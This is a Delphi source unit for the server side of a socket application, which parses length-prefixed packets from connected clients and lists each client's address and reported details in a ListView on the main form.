unit untClientObject;

interface

uses
  System.Win.ScktComp,
  Windows,
  Sysutils,
  CLasses,
  ComCtrls,
  untUtils;

const
  CMD_ONLINE = 0;

type
  TClientThread = class(TObject)
  private
    procedure ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
  protected
  public
    Data:AnsiString;
    mySocket:TCustomWinsocket;
    lstItem:TListItem;
    constructor Create(CreateSuspended: Boolean);
    procedure Cleanup;
    procedure ReadData;
    function SendBuffer(bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
  end;
implementation

uses Unit1;

procedure TClientThread.ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
var
  lstTokens:TStringList;
  tempGUIString:String;
begin
  case bCMD of
    CMD_ONLINE:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        lstTokens := Explode('|', tempGUIString);
        if lstTokens.Count >= 2 then
        begin
          if not Assigned(Self.lstItem) then
          begin
            lstItem := Form1.Listview1.Items.Add;
            lstItem.Caption := mySocket.RemoteAddress;
            lstItem.ImageIndex := 0;
            lstItem.SubItems.Add(lstTokens[0]);
            lstItem.SubItems.Add(lstTokens[1]);
            lstItem.SubItems.Objects[0] := Self;
            SendBuffer(CMD_ONLINE,'TEST',10);
          end;
        end else begin
          mysocket.Close;
          exit;
        end;
      end;
  end;
end;

function TClientThread.SendBuffer(bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
    Result := False;
    ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
    lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
    if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
    begin
      CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
    end;
    with LPSocketHeader(@szSendBuffer)^ do
    begin
      dwSocketLen := iBufferLen + 1;
      bSocketCmd := bySocketCmd;
    end;
    Dec(DWORD(lpszSendBuffer));
    iBufferLen := iBufferLen + SizeOf(TSocketHeader);
    iSendLen := mySocket.SendBuf(szSendBuffer, iBufferLen);
    if (iSendLen = iBufferLen) then
      Result := True;
    Sleep(0);
end;

procedure TClientThread.Cleanup;
begin
end;

constructor TClientThread.Create;
begin
  mySocket := nil;
end;

procedure TClientThread.ReadData();
var
  DataSize: Cardinal;
  mData:AnsiString;
  bByte:Byte;
  LengthDataSize,LengthSocketData: integer;
begin
  if mySocket = nil then exit;
  if mySocket.Data = nil then exit;

  if Data = '' then exit;

  CopyMemory(@DataSize, @Data[1], 4);
  LengthDataSize := 4;
  LengthSocketData := Length(Data) - SizeOf(DataSize);
  if LengthSocketData < (DataSize ) then exit;
  Delete(Data,1,4);
  mData := Copy(Data,1,DataSize);
  Delete(Data,1,Length(mData));
  bByte := Byte(mData[1]);
  Delete(mData,1,1);
  Dec(DataSize);
  ParsePacket(@mData[1], DataSize, bByte);
  if Length(Data) > 0 then begin
    ReadData;
  end;
end;
end.
